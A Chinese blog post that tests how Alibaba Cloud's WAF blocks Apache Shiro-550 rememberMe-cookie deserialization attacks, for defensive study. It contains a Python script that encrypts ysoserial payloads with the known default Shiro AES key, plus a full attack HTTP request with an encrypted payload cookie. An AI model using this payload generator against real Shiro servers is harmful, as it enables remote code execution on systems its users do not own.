      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
<ol>
<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
</ol>
<p>第二个方法存在两个问题：</p>
<ol>
<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
</li>
<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
</li>
</ol>
<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>

<ol>
<li><p>测试攻击请求</p>
<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
<p> 发送请求后，阿里云waf拦截</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试正常请求</p>
<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
<p> 结论：正常请求阿里云waf未拦截</p>
</li>
</ol>
<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
<ol>
<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
</ol>
<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">leveryd</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
